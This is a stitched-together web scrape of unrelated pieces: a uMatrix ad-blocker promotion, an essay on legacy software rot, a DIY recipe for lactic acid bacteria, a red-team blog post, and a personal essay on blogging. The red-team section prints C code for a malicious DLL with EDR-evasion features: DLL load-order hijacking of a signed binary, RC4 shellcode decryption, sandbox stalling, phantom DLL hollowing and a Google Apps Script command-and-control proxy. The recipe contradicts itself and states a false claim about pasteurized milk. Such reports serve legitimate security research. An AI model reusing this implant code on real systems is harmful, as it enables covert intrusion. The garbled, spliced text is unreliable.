<p><img loading="lazy" alt="" height="967" src="https://www.electricmonk.nl/log/wp-content/uploads/2017/10/cnn_clean.png" width="820" srcset="https://www.electricmonk.nl/log/wp-content/uploads/2017/10/cnn_clean.png 820w, https://www.electricmonk.nl/log/wp-content/uploads/2017/10/cnn_clean-254x300.png 254w, https://www.electricmonk.nl/log/wp-content/uploads/2017/10/cnn_clean-768x906.png 768w" sizes="(max-width: 820px) 100vw, 820px"></p>
<p>Look at that beauty. It’s clean.&nbsp;It loads super fast.&nbsp;It cannnot track me.&nbsp;It’s free of ads, pop-ups, auto playing videos, scripts and cookies. Remember, this didn’t take any manual unblocking. This is just what it looks like out of the box with umatrix.</p>
<p>Umatrix makes the web usable again.</p>
<h2>Get it, install it, love it</h2>
<p>Get it for&nbsp;<a href="https://addons.mozilla.org/firefox/addon/umatrix/">Firefox</a>,&nbsp;<a href="https://chrome.google.com/webstore/detail/%C2%B5matrix/ogfcmafjalglgifnmanfmnieipoejdcf">Chrome</a>&nbsp;or&nbsp;<a href="https://addons.opera.com/en-gb/extensions/details/umatrix/">Opera</a>. Umatrix is <a href="https://github.com/gorhill/uMatrix">Open Source</a>, so it cannot be bought out by ad agencies.</p>
<p>Read <a href="https://www.electricmonk.nl/docs/umatrix_tutorial/umatrix_tutorial.html">my tutorial to get started with umatrix</a>, as the learning curve is fairly steep.</p>
<p>Thanks for reading and safe browsing!</p>


<p><sup><a id="note_1" name="note_1">*)</a> Someone will probably bring up the whole “but content creators should / need / deserve money too!” argument again. I’m not interested in discussions about that. They’ve had the chance to behave, and they’ve misbehaved time and time again. At some point, you don’t trust the pathological liars anymore. No content creator switched to a more decent ad provider that doesn’t fuck its customers over. The blame is on them, not on the people blocking their tracking, spying, attention-grabbing shit. Don’t want me looking at your content for free? Put up a paywall. People won’t come to your site anymore if you did that? Then maybe your content wasn’t worth money in the first place.</sup></p>

<p>I recently <a href="https://twitter.com/jxxf/status/1219009308438024200" target="_blank" rel="noreferrer noopener">came across a story</a> that is just as amusing as it is shocking:</p>



<blockquote><p><em>One of my clients is responsible for several of the world’s top 100 pension funds. They had a nightly batch job that … crashed. No one knew what was wrong at first. This batch job had never, ever crashed before, as far as anyone remembered or had logs for.&nbsp;</em></p><p><em>The person who originally wrote it had been dead for at least 15 years, and in any case hadn’t been employed by the firm for decades. The program was not that big… but it was fairly impenetrable — written in a style that favored computational efficiency over human readability. And of course, there were zero tests.&nbsp;</em></p><p><em>As luck would have it, a change in the orchestration of the scripts that ran in this environment had been pushed the day before. This was believed to be the culprit. Engineering rolled things back to the previous release. Unfortunately, this made the problem worse.</em></p><p><em>…</em></p><p>Another program, the benefits distributor, was supposed to alert people when contributions weren’t enough for projections… <em>Noticing that there was no output from the first program since it had crashed, it treated this case as “all contributions are 0”. This, of course, was not what it should do. But no one knew it behaved this way since, again, the first program had never crashed.</em></p><p><em>…</em></p><p><em>I got an unexpected text from the CIO. “sorry to bother you, we have a huge problem. s1X. Can you fly in this afternoon?” S1X is their word for “worse than severity 1 because it’s cascading other unrelated parts of the business”.</em></p></blockquote>



<p>Fortunately all of our pensions are safe and the above story has a happy ending. But it is hardly reassuring that our mission-critical financial systems are relying on antiquated software that literally no one alive understands.</p>



<p><em>Yet another story with a less happy ending – <a rel="noreferrer noopener" href="https://www.bbc.com/news/technology-54423988" target="_blank">16,000 coronavirus cases went unreported in England because of an agency’s use of an obsolete 30 year old file format</a>.</em></p>



<h2>Businesses for Bit Rot</h2>



<p>It turns out the above is no isolated example. Back in 2012 when I left Intel to join Sun, I realized just how badly their SPARC product line was doing. Once the golden goose of the dot-com server era, it had since fallen incredibly far behind Intel’s Xeon product line. I was literally told by my own manager, to run our simulations on the Intel Xeon servers and not the SPARC server farm, because <em>“it is very slow.”</em> Even worse, not only did Intel’s CPUs perform better, their manufacturing edge meant that they were significantly cheaper to make as well.</p>



<p>The next obvious question that I had: Why on earth are people even buying our SPARC chips, if they are so far behind the competition? The answer I got from a senior architect boggled my mind. Our customers had software systems so ossified, that they could only ever be run on SPARC/solaris systems. Migrating to x86/Linux would be too herculean a task for them to take on. In many cases, they had even <em>lost</em> their source code, preventing them from even recompiling their applications. The best they could ever do was to upgrade to the latest generation of the same SPARC processors, regardless of how slow or expensive they were.</p>



<p>That’s right, our entire division’s business model revolved around corporate America’s rotting software systems.</p>



<h2>The Cost of Keeping The Lights On</h2>



<p>When I first joined Amazon, I found myself working on the perfect archetype of a legacy system. It was initially developed with tons of tech debt… by another team… which had long since disbanded. Ownership of the project had then been transferred over to our team… and it proved to be so unpopular, that developers started transferring out to other teams in droves. Of the ~10 team members when I joined, not a single one still remained a year later.</p>



<p>On the surface, the system had many things going for it. It was written in a modern language and tech stack (Java 8). It had an entire team of six-figure-income developers supporting it daily. And it was constantly being updated to fix bugs and/or add new features.</p>



<p>And yet, despite all this, it was easy to see how the turnover was weighing down the system like an albatross. As a result of the ownership change and team turnover, a tremendous amount of institutional knowledge was lost. Knowledge such as overall code design, end-to-end functionality, best practices and debugging techniques. We were working hard to keep things chugging along. And yet, it felt like we were bogged down in a swamp, constantly second-guessing every change, surrounded on all sides by a fog of war.</p>



<p>Can you imagine how much worse things would have been if the project was running on Java 1, with zero active development, and no developers assigned to own it?</p>



<h2>Preventing Catastrophic Failure</h2>



<p>As software developers, we strive to produce robust bug-free systems that can simply be left to run on their own, for years and years, without any manual intervention. By that metric, the pension fund’s script is surely a smashing success.&nbsp;</p>



<p>And yet, the harsh reality is that everything will break… one day. Everything will eventually need to be updated.&nbsp;</p>



<ul><li>Maybe your system relies on hardware that is no longer being produced</li><li>Or your system has dependencies that are now defunct</li><li>Or dependencies with major security vulnerabilities and the only patches are on backwards incompatible versions</li><li>Or the application was developed based on <a rel="noreferrer noopener" href="https://en.wikipedia.org/wiki/Year_2000_problem" target="_blank">certain assumptions that are no longer true</a></li><li>Or the world has simply changed, and the application needs to change with it</li></ul>



<p>No matter what the reason is, <em>change is inevitable</em>. The only question is how painful it will be, when it finally arrives. </p>



<p>If you have a system that is being actively worked on, change need not be all that painful. But if you have a system that has been completely ignored for multiple years or even decades, there are so many things that can go catastrophically wrong.</p>



<ul><li>The people who built the system may no longer be at the company</li><li>The source code may get lost</li><li>People may not know how to properly compile the source code, to produce the executable</li><li>Or deploy the new executable</li><li>Or correctly run the executable, with all flags correctly configured</li><li>Or make sense of the code architecture and implementation</li><li>Or the invariants and implicit assumptions that the code relies on, in order to function correctly</li><li>Or run the automated tests</li><li>Or debug test failures</li><li>Or debug production failures</li><li>Or access production logs and metrics</li></ul>



<p>Trying to exhaustively document all of the above, will help. But your documentation will always be sub-optimal. It will always contain gaping holes. Comprehensive documentation is no substitute for getting your hands dirty.</p>



<h2>An Idle Mind</h2>



<p>Having a dedicated developer who is responsible for owning and maintaining all of the above, is definitely a good first step. But it is not sufficient.</p>



<p>People will only “read the docs” so many times, before getting bored. They will not get the same learnings that come only from experience. And solving real problems.</p>



<p>If asked to “audit” things, there’s a very good chance that they will simply rubber-stamp it and sweep it under the rug, while focusing on other newer and shinier projects… or simply goofing off. Without any real deliverables or challenges, many will simply follow the path of least resistance.</p>



<p>If you truly want to avoid software rot, the only way is to ensure that you’re continuously moving. Even if it seems unnecessary or risky. Simply because the best way to build and maintain and verify your institutional knowledge and capabilities, is through continually making changes, and testing your ability to successfully execute on these changes. The day you stop moving, is the day your institutional knowledge starts decaying and falling apart.</p>



<p>Even moving in circles, as ridiculous as it sounds, would be an improvement over neglect. But more realistically, there is always something the maintainers can do to move the needle forward, even if it is in tiny amounts.</p>



<p>You could update your environment to use the latest versions of all dependencies:</p>



<ul><li>Such as migrating from JDK 8 to 11</li><li>Or updating your JVM to use the G1 garbage collector instead of CMS</li><li>Or updating your GCC compiler from version 5 to 7</li><li>Or upgrading your Database from Postgres 9.5 to Postgres 11</li><li>Or updating your AWS SDK from version 1.10 to 1.11</li><li>Or installing the latest linux distro on your production fleet</li></ul>



<p>In severe cases where your dependencies are hopelessly obsolete, you can investigate migrating to a newer stack entirely:</p>



<ul><li>Such as migrating from SPARC to x86.</li><li>Or Solaris to Linux.</li></ul>



<p>You can keep your developers sharp by updating your application as well:</p>



<ul><li>Such as fixing any lingering bugs and edge cases</li><li>Or strengthening your automated test suite</li><li>Or cleaning up tech debt</li><li>Or making performance optimizations</li><li>Or implementing new features</li><li>Or simply refactoring your code incrementally to make it more readable</li></ul>



<p>The above changes are bound to introduce transient risks and incur seemingly <em>“unnecessary”</em> expenses. Inevitably, your developers will make mistakes and introduce bugs. When faced with such costs, it is very tempting to simply step back and do nothing at all. <em>“If it ain’t broke, don’t fix it.”</em></p>



<p>If the system in question provides minimal business value, that may even be the rational thing to do. But for any mission-critical system, neglect will only tradeoff smaller transient risk, for permanent catastrophic risk. The risk that one day, your system will need to be urgently debugged or updated, but your organization will find itself utterly incapable of doing so.</p>



<p>For any mission-critical system, it is vital to preserve institutional knowledge and capability. And the only way to do that is through continual exercise. Your (company’s) brain is a muscle. Use it or lose it.</p>

<p><em>This article was originally published in Garden Culture Magazine </em><a rel="noreferrer noopener" aria-label="US22 (opens in a new tab)" href="https://gardenculturemagazine.com/magazine/usa-canada-issue-22/" target="_blank"><em>US22</em></a><em> and </em><a rel="noreferrer noopener" aria-label="UK25 (opens in a new tab)" href="https://gardenculturemagazine.com/magazine/uk-ireland-issue-25/" target="_blank"><em>UK25</em></a><em>. </em></p>



<blockquote><p><em>That’s right, dearest reader; it’s time for the latest installment of how to make your own organic growing inputs, courtesy of Korean Natural Farming practices. Ditch the bottles, make your own inputs and feel like a complete boss while you’re doing it.</em></p></blockquote>



<p>It’s the little things in life that count: something I constantly re-iterate to my loving wife. Like some sort of defensive mantra that is definitely in no way linked to the size of my manhood, the quality of any one particular thing in life is always of much more importance than its quantity. The Flight of the Conchords say, “two minutes in heaven is better than no minutes in heaven”. Sure, bigger things may initially seem more gratifying to our inherently greedy human brains, but I’d much rather a small amount of something perfect, than a huge load of something satisfactory. </p>



<p>What I’m trying to convey is just how important small things are, especially when talking about bacteria. In a similar fashion to their fungal friends, they play a wide variety of roles in plant growth and are particularly crucial when growing in an organic setting. Soil life thrives with healthy and diverse biology, so it is crucial that you almost pay more attention to promoting the health of your soil biology than you do the actual plants growing in it. One particular type of beneficial bacteria that you can easily culture from the natural world is Lactic Acid Bacteria (LAB), which will be the focus of our attention for the next few pages.</p>



<h2><strong>What exactly are LAB’s?</strong></h2>



<p>Lactic Acid Bacteria (LAB) are a particularly interesting group of bacteria that are one of the key components of a full-blown KNF regime. Why are they particularly interesting, I hear you ask? Well, they are one of the few groups of bacteria that are capable of functioning in both aerobic and anaerobic conditions. “Anaerobic bacteria?” I hear you cry, “What the crikey-fuck do you want them for? That’s root disease territory isn’t it?” Well, yes, the majority of root diseases are anaerobic pathogens, but these bacteria are cut from an entirely different cloth, my friend.</p>



<p>This particular group of bacteria (as the name would suggest) produce lactic acid as a by-product of their digestive process. LAB are extremely widespread in nature, found pretty much everywhere in the environment, hence why capturing and culturing them is actually quite an easy and fun process. This is also one of the first steps in making your own cheese. </p>



<p><strong>What do they even bloody do?</strong></p>



<div><figure><img loading="lazy" src="https://gardenculturemagazine.com/wp-content/uploads/2019/05/whey-LAB.jpg" alt="LAB DIY" width="350" height="427" srcset="https://gardenculturemagazine.com/wp-content/uploads/2019/05/whey-LAB.jpg 350w, https://gardenculturemagazine.com/wp-content/uploads/2019/05/whey-LAB-250x305.jpg 250w, https://gardenculturemagazine.com/wp-content/uploads/2019/05/whey-LAB-120x146.jpg 120w" sizes="(max-width: 350px) 100vw, 350px"></figure></div>



<p>There are a few ways in which making use of LAB can benefit your grow. You don’t even have to go the whole hog on the organic regime front either; you can integrate it quite easily into pretty much any style of growing. One of the first things they do is simply populate space in your media. This might sound a bit boring and of no significance, but by populating free space in your media, they will be preventing harmful pathogens from ever making their way in. Similar to how bouncers at a club turn away groups of drunken men without any women with them, but probably with a higher IQ.</p>



<p>But wait – there’s more! Not only do they help to out-populate bad bacteria, they also help to break down organic nutrients locked away in those pesky organic carbon complexes within your media. The decomposition of organic matter/amendments is greatly increased within the media when you apply a LAB serum, meaning a much greater availability of nutrients for absorption by the plants. For this reason, they are a fantastic addition when you are making your own compost or compost teas, as they will help to greatly increase the availability of all of that lovely organic nutrient. It’s kind of like little knives and forks going around and cutting up all the food on the plate ready for the plant to eat.</p>



<p>One thing to potentially look out for when you are using LAB culture, particularly with fruiting plants, is that you slow down with the application rate towards the end of the flowering cycle. This is just to ensure that you are not over-applying LAB’s, as in certain circumstances, over application can actually cause a response in the plant that will lower the Brix levels in your fruits. This obviously results in a slight loss of sweetness in the overall flavor of your fruit, something to be avoided if at all possible. </p>



<h2><strong>How exactly do you make it?</strong></h2>



<p><strong>You will need:</strong></p>



<div>




<div>
<ul><li>Milk</li><li>Strainer</li><li>Sugar (optional)</li></ul>
</div>
</div>



<div><p>Essentially, what you are doing here is making curds and whey. Miss Muffet would probably love to get her hands on such freshly-prepared dairy produce.</p> <ol><li><strong></strong> <p>Wash your rice in some water. Just like you would if you were normally making rice, but rather than discarding the water, pour it into a container to about two thirds full.</p> </li><li><strong></strong> <p>Cover the container with a breathable lid. Store in a cool, dry, and dark place, moving it as little as possible.</p> </li><li><strong></strong> <p>Wait three to five days. You will know when it is done as the smell of the liquid will become slightly sweet. This means that the LAB has cultured correctly in the solution. If you see any weird-looking bacteria growing on the surface during this time, discard and start again.</p> </li><li><strong></strong> <p>Try to collect the middle layer of the solution. There will be a slightly thicker layer at the top of the liquid, which ideally you do not want to collect. Focus on the layer directly underneath this.</p> </li><li><strong></strong> <p>Add 1-part cultured rice wash to 10 parts of your milk. Ideally, do not do this with milk that is either pasteurized (because of the antibiotics) or straight out of the fridge (slows the process down slightly). Once again, store in a cool, dry, and dark place.</p> </li><li><strong></strong> <p>After three to five days (longer when temperatures are cooler), you will see that the solution has totally separated into curds and whey. The curds will be at the top and the yellow whey serum at the bottom. The yellow liquid is the LAB culture.</p> </li><li><strong></strong> <p>Separate the solids from the liquids. This involves a quick straining through an appropriate implement. There will be a little layer of solids at the bottom as well; try to avoid collecting these in your final solution.</p> </li><li><strong></strong> <p>Put LAB liquid into a container and store in a fridge for use. Use at 1 mL per liter once a week until the mid-flower period. If you want to make it for long-term storage, add equal weight brown sugar to the liquid.</p> </li></ol></div>



<div><figure><img loading="lazy" width="324" height="243" src="https://gardenculturemagazine.com/wp-content/uploads/2019/05/LAB.jpg" alt="Lactic acid bacteria DIY" srcset="https://gardenculturemagazine.com/wp-content/uploads/2019/05/LAB.jpg 324w, https://gardenculturemagazine.com/wp-content/uploads/2019/05/LAB-250x188.jpg 250w, https://gardenculturemagazine.com/wp-content/uploads/2019/05/LAB-120x90.jpg 120w" sizes="(max-width: 324px) 100vw, 324px"></figure></div>



<h2><strong>Jobs a good’un</strong></h2>



<p>So, that is basically it. You now are the proud owner of some LAB serum that is perfect for immediate use as a root drench, or just as good to use in a compost tea brew. It also makes a great addition to a compost pile, helping to process the waste into a rich material much faster than it would usually take.</p>



<p>Like most KNF inputs, you can use this as a one-off additive, even if you aren’t growing in a typical organic environment. For example, if you are a coco/hydroponic grower, you can inoculate your media at 1 mL per liter to get all the benefits of Lactic Acid Bacteria, without changing anything else about your particular methods. </p>



<p>Anyway, just remember the next time you are making some rice, that wastewater from the rinse could be put to much better use than simply pouring down your sink.<br></p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-1719"><div><div><div id="primary"><main id="main" role="main"><div><div><p>It is both common and important for the development of a <a href="https://www.blackarrow.net/red-team/">Red Team</a> exercise to obtain information about the technologies and restrictions of the environment where our TTPs are going to be executed. This information mainly implies substantial changes in our <em>modus operandi</em>. Generally, one of these changes is to put aside known/public offensive tools and develop our own custom implants ad-hoc for the customer’s ecosystem, at the initial stages of infection where the chances of detection are high.</p><p>The following case that we would like to share is a clear example of this type of exercise. In one of our clients, we did obtain information about the EDR (Endpoint Detection &amp; Response) technology deployed and the network restrictions for outgoing connections, where only domains such as Google, Microsoft, etc. are allowed.</p><p>After studying different approaches to bypass these restrictions, we proceed to develop a custom implant with the necessary capabilities to reach the BlackArrow C&amp;C and carry out various post-exploitation actions without being detected. The following diagram represents the steps performed by the implant:</p><div><figure><a href="https://www.blackarrow.net/wp-content/uploads/2020/11/implant-1.png"><img src="https://www.blackarrow.net/wp-content/uploads/2020/11/implant-1-1024x643.png" alt="" srcset="https://www.blackarrow.net/wp-content/uploads/2020/11/implant-1-1024x643.png 1024w, https://www.blackarrow.net/wp-content/uploads/2020/11/implant-1-362x227.png 362w, https://www.blackarrow.net/wp-content/uploads/2020/11/implant-1-768x482.png 768w, https://www.blackarrow.net/wp-content/uploads/2020/11/implant-1.png 1324w" sizes="(max-width: 1024px) 100vw, 1024px"></a><figcaption>Implant logic</figcaption></figure></div><h2>Step 1: DLL Order Hijacking</h2><p>It is known that the use of <strong>DLL Order Hijacking</strong> is still quite efficient not only with AVs but also against EDR technologies. It is no wonder that multiple actors have been using these evasion techniques <a href="https://malpedia.caad.fkie.fraunhofer.de/details/win.plugx">for years</a>. As an input vector for the exercise, we chose one of the binaries used in a recent campaign described by Dr. Web in his report “<a href="https://st.drweb.com/static/new-www/news/2020/october/Study_of_the_ShadowPad_APT_backdoor_and_its_relation_to_PlugX_en.pdf">Study of the ShadowPad APT backdoor and its relation to PlugX</a>” . Specifically, we used the legitimate binary <strong>TosBtKbd.exe</strong> signed by TOSHIBA CORPORATION that, as shown below, is susceptible to DLL order hijacking in its function 0x4024A0.</p><figure><a href="https://www.blackarrow.net/wp-content/uploads/2020/11/DLL-Order-Hijacking.png"><img src="https://www.blackarrow.net/wp-content/uploads/2020/11/DLL-Order-Hijacking.png" alt="" srcset="https://www.blackarrow.net/wp-content/uploads/2020/11/DLL-Order-Hijacking.png 999w, https://www.blackarrow.net/wp-content/uploads/2020/11/DLL-Order-Hijacking-362x124.png 362w, https://www.blackarrow.net/wp-content/uploads/2020/11/DLL-Order-Hijacking-768x264.png 768w" sizes="(max-width: 999px) 100vw, 999px"></a><figcaption>DLL Order Hijacking (TosBtKbd.exe)</figcaption></figure><p>As we can see in the image, the DLL “TosBtKbd.dll” is loaded, via <code>LoadLibrary()</code>, without specifying its full path, making it possible to load a harmful DLL. Notice that the <code>SetTosBtKbdHook</code> symbol is invoked immediately.</p><h2>Step 2: RC4 Decryption (reflective PE)</h2><p>Running TosBtKbd.exe will trigger the harmful actions through our DLL. The skeleton of <a href="https://github.com/blackarrowsec/redteam-research/tree/master/EDR_AV%20Bypass/Google%20Script%20Proxy">this library</a> is shown below.</p><pre data-enlighter-language="c" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="true" data-enlighter-lineoffset="181" data-enlighter-title="" data-enlighter-group="">//#include "syscalls.h" //SysWhispers
void __stdcall UnHookTosBtKbd(void) {}
void __stdcall SetTosBtKbdHook(void)
{
	char key[11];
	stale();

	//Get RC4 Key (TimeDateStamp DWORD value)
	DWORD ts = getKey();
	if (ts == NULL) return;

	sprintf_s(key, "%X", ts);
	DWORD dwCount;

	//Get encrypted shellcode from resource
	PCHAR exec = getResource(&amp;dwCount);
	if (exec != NULL)
	{
		//Decrypt shellcode
		decrypt(key, exec, &amp;dwCount);

		//Lazy check (reflective loading stub)
		if ((exec[1] == 'Z') &amp;&amp; (exec[2] == 'E'))
		{
			uint8_t* pMapBuf = nullptr, * pMappedCode = nullptr;
			uint64_t qwMapBufSize;

			//Phantom DLL hollowing
			//Ref: github.com/forrest-orr/phantom-dll-hollower-poc

				VirtualFree(exec, NULL, MEM_RELEASE);

				//Less obvious indirect call
				__asm
				{
					mov eax, pMappedCode
					push eax;
					ret
				}
			}
		}
	}
}</pre><p>First of all, the <code>stale()</code> function is run. Its goal is to distract and confuse some machine learning checks and sandboxes that execute the DLL looking for malicious activity. By playing with the variable <code>limit</code>, we can get a delay of seconds/minutes before executing the malicious actions.</p><pre data-enlighter-language="c" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="102" data-enlighter-title="" data-enlighter-group="">double c(int num1) { return (16 / (num1 * pow(5.0, num1 * 1.0))); }
double c1(int num1) { return (4 / (num1 * pow(249.0, num1 * 1.0))); }

void stale()
{
	// Stale code. Play with the "limit" var to look for a delay you feel happy with 
	double limit = 100;
	int j = 0;
	double ans1 = 0.0;
	double ans2 = 0.0;
	int flag = 1;

	for (j = 1; j &lt;= limit; j += 1) {
		if (flag == 1) {
			ans1 += c(j);
			ans2 += c1(j);
			flag = 0;
		}
		else {
			ans1 -= c(j);
			ans2 -= c1(j);
			flag = 1;
		}
	}
	printf("%f", ans1);
}</pre><p>Afterwards, an embedded resource in the DLL will be loaded and decrypted using the Windows CryptoAPI. This resource is a binary encrypted with RC4 that implements the main logic of the implant, that is, to establish communication with our C&amp;C and execute post-exploitation actions.</p><figure><a href="https://www.blackarrow.net/wp-content/uploads/2020/11/Resource-decryption.png"><img src="https://www.blackarrow.net/wp-content/uploads/2020/11/Resource-decryption-1024x363.png" alt="" srcset="https://www.blackarrow.net/wp-content/uploads/2020/11/Resource-decryption-1024x363.png 1024w, https://www.blackarrow.net/wp-content/uploads/2020/11/Resource-decryption-362x128.png 362w, https://www.blackarrow.net/wp-content/uploads/2020/11/Resource-decryption-768x272.png 768w, https://www.blackarrow.net/wp-content/uploads/2020/11/Resource-decryption-1536x545.png 1536w, https://www.blackarrow.net/wp-content/uploads/2020/11/Resource-decryption.png 1770w" sizes="(max-width: 1024px) 100vw, 1024px"></a><figcaption>Resource decryption (reflective PE)</figcaption></figure><p>It has been observed that some EDRs exclusively upload the unknown binaries to their cloud-sandbox for analysis, which is why TosBtKbd.exe’s TimeDataStamp has been used as RC4 key. Using a key from a file header of the container process, will make necessary an analysis within the appropriate context to recover the decrypted binary, which translates into more time for a hunter or malware analyst to obtain artifacts of interest such as, for example, the IP or domain of our C&amp;C.</p><p> The following image shows the creation of the reflective PE from the binary compiled from Visual Studio using <a href="https://github.com/hasherezade/pe_to_shellcode">pe_to_shellcode</a> (developed by security researcher Hasherezade).

Using this approach, created by the researcher Forrest Orr, it is possible to execute the binary within a + RX section, making it very difficult to detect it using traditional tools based on RWX allocations or <a href="https://gist.githubusercontent.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2/raw/104f630cc1dda91d4cb81cf32ef0d67ccd3e0735/Get-InjectedThread.ps1">suspicious threads</a>.</p><p>In our case, the DLL used to make the phantom is&nbsp;<strong>aadauthhelper.dll</strong>, which was&nbsp;chosen based on the size of its .text section to house our reflective PE. You can notice the loader stub right at the beginning of that section (0x556C1000).</p><figure><a href="https://www.blackarrow.net/wp-content/uploads/2020/11/RX-section.png"><img src="https://www.blackarrow.net/wp-content/uploads/2020/11/RX-section.png" alt="" srcset="https://www.blackarrow.net/wp-content/uploads/2020/11/RX-section.png 1006w, https://www.blackarrow.net/wp-content/uploads/2020/11/RX-section-362x149.png 362w, https://www.blackarrow.net/wp-content/uploads/2020/11/RX-section-768x317.png 768w" sizes="(max-width: 1006px) 100vw, 1006px"></a><figcaption>RX section (aadauthhelper.dll)</figcaption></figure><p>To start our implant’s execution, once the Hollowing DLL has been done, the classical cast of a function pointer (<code>call eax</code>) has been replaced with a less obvious indirect call: <code>push eax, ret</code>.</p><pre data-enlighter-language="c" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="209" data-enlighter-title="" data-enlighter-group="">//Phantom DLL hollowing

Regarding various alternatives, such as Domain-Fronting and <a href="https://github.com/SixGenInc/Noctilucent">similar techniques</a>, we opted for something more “innovative”. In this context, we took an idea from a Forcepoint <a href="https://www.forcepoint.com/blog/x-labs/carbanak-group-uses-google-malware-command-and-control">analysis</a> on certain Carbanak TTPs where said actor abused the <strong><a href="https://developers.google.com/apps-script">Google Apps Script</a></strong> to send and receive commands. Instead of using said platform as a command and control server, its scripting capabilities would be used to configure a proxy that allows us to reach our C&amp;C.</p><p>It should be noted that there are various <a href="https://github.com/a-rey/google_RAT">offensive tools</a> that already take advantage of this platform in a very similar way to the initial idea raised by the <a href="https://www.blackarrow.net/red-team/">Red Team</a>/<a href="https://www.blackarrow.net/managed-detection-and-response-mdr/">Threat Hunting</a> team at BlackArrow. However, given the small number of real incidents that make use of these TTPs, it was considered that it could be the most appropriate approach to test the filtering capabilities of our target.</p><p>The result has been the development of a binary in C that makes use of the approach described in the following graphic.</p><figure><a href="https://www.blackarrow.net/wp-content/uploads/2020/11/GoogleScript.png"><img src="https://www.blackarrow.net/wp-content/uploads/2020/11/GoogleScript-1024x756.png" alt="" srcset="https://www.blackarrow.net/wp-content/uploads/2020/11/GoogleScript-1024x756.png 1024w, https://www.blackarrow.net/wp-content/uploads/2020/11/GoogleScript-362x267.png 362w, https://www.blackarrow.net/wp-content/uploads/2020/11/GoogleScript-768x567.png 768w, https://www.blackarrow.net/wp-content/uploads/2020/11/GoogleScript.png 1336w" sizes="(max-width: 1024px) 100vw, 1024px"></a><figcaption>Connections through proxy (Google Apps Script)</figcaption></figure><p>At first, our implant will launch a GET request (via HTTPS) in which it will embed, in one of its parameters, the URL of the C&amp;C. This URL will be extracted from Google Apps Script and will act as an intermediary between the client’s communications and the control server.</p><p>After receiving the first GET, our C&amp;C will return a random 10-byte token to the client. This token ensures that the connection comes from a legitimate host. Periodically, the implant, via POST, will check for new jobs. The result of these jobs (<em>ps</em>, <em>screenshot</em>, <em>getinfo</em>, etc.) will be sent to our C&amp;C encoded in base64.</p><p>The code snippet belows shows the main loop in charge of managing the collection and sending of the results associated with each job.

	<section>
	
<p>Sometime last week someone tweeted that people make the mistake of writing things that are interesting to themselves – they should write stuff that people want to read. I think that is an unfortunate view, because the world would be so much lesser if everyone only wrote about mainstream topics and no one wrote about niche interests. That view is valid if we’re trying to make a living through our writing…but in this current world, there are very few places in the world one can be truly themselves, and our personal websites should be considered a sacred place where we can be so.</p>



<p>I was clearing my RSS feeds that were accumulated over the course of over ten years, and it was genuinely saddening to me how many websites or blogs do not exist anymore. Because of its digital nature, websites are treated as transient, fleeting. But they have this power to affect people, to open rare windows into people’s personal thoughts and private lives. Social media has somewhat cheapened this because of its velocity and noise. But once upon a time, the internet was a magical place where I derived so much joy, comfort and inspiration from people’s blogs.</p>



<p>I still think the internet is a magical place, just that the magic is buried among the noise. While cleaning my RSS feeds I happened to read <a href="https://kottke.org/20/11/the-moral-calculus-of-covid-19">this beautiful piece</a>. I cannot precisely say why it is beautiful to me, but if I could take a guess perhaps it is the way the writer took what he consumed, thought and felt deeply about them, and expressed those sentiment through picking words and weaving them into sentences the way only he can. Or at least it made me feel that way – that only a person like the writer could have written this piece: it was a piece that was produced through his lens, his filters, his worldview, his language arsenal. A piece writing about a theme everyone is concerned about, but managed to sound profoundly emotive.</p>



<p>It made me want more. Where can I find writing like this? Who are the bloggers writing like this these days? They are probably buried in substack somewhere. Maybe it is too much to ask for writing like this to exist on a public blog for free.</p>



<p>I myself have learned that the force of personal expression must be fiercely guarded. This world is always tempting us to sway. To dilute our voices, our interests, so we can feel like we fit in. It was also on twitter that I found <a href="https://www.lewissociety.org/innerring/">this piece by C.S Lewis</a> on the dangers that come with wanting to fit in and also the reward if only we can break out of it:</p>



<blockquote><p>The quest of the Inner Ring will break your hearts unless you break it. But if you break it, a surprising result will follow. If in your working hours you make the work your end, you will presently find yourself all unawares inside the only circle in your profession that really matters. You will be one of the sound craftsmen, and other sound craftsmen will know it. This group of craftsmen will by no means coincide with the Inner Ring or the Important People or the People in the Know. It will not shape that professional policy or work up that professional influence which fights for the profession as a whole against the public: nor will it lead to those periodic scandals and crises which the Inner Ring produces. But it will do those things which that profession exists to do and will in the long run be responsible for all the respect which that profession in fact enjoys and which the speeches and advertisements cannot maintain.</p><cite>C.S. Lewis, <a href="https://www.lewissociety.org/innerring/">The Inner Ring</a></cite></blockquote>



<p>I like discovering esoteric gems like that even if I don’t fully appreciate it. That is why periodically I still comb twitter as if I was on a beach with a metal detector, even though I have social media fatigue. It is a lot of work to sit in the noise, an effort that is worth it whenever I come across something that changes the way I feel or think about the world.</p>



<hr>



<p>We are 7 billion+ micro-realities interacting with each other:</p>



<blockquote><p>it occured to me that everyone’s inner world is an unmatched micro-reality on its own (it is impossible to have two exact same psyches), which means that there’s 7 billion plus interacting micro-realities walking around in this world. Wow. We affect each other’s reality by the quality of our own inner-reality.</p><cite>– dayone, 1 Sep 2018</cite></blockquote>



<p>The things I choose to write, to observe, to document, to analyse, the way I string together my words, the words I choose — these are all outcomes of every single thing I have experienced in my life. No two people can have the same experience. No two people can interpret their experiences the exact same way. You are the only person in the world who can make something that comes out of <em>your </em>own inner-reality, an outcome of the unique mix-mash of the experiences you have and the media you consume.</p>

<p>That is beautiful and precious, it is not something that can be replicated. It is an opportunity to allow another person to experience you, to experience your inner world, your imagination, in a way that is not possible in a physical interaction. The internet is a place where we as clumsy human beings can translated into art, and I wish the spirit to encourage personal expression (within legal and ethical limits) can be safeguarded.</p>

<p>This time around, the changes are big enough across the board that the sub-projects will get individual posts instead of being clumped together, and that will become a recurring theme as the progress cadence becomes less and less interlocked.</p>



<p>We also have a sister blog at <a href="https://www.divergent-desktop.org/">www.divergent-desktop.org</a> that will slowly cover higher level design philosophy, rants and reasoning behind some of what is being done here. A few observant ones have pieced together the puzzle — but most have not.</p>



<p>This release is a thematic shift from low level graphics plumbing to the network transparency related code. We will still make and accept patches, changes and features to the lower video layers, of course — ‘Moby Blit’ is still out there — but focus will be elsewhere. Hopefully this will be one of the last time these massive releases make sense, and we can tick on a (bi-)monthly basis for a while.</p>



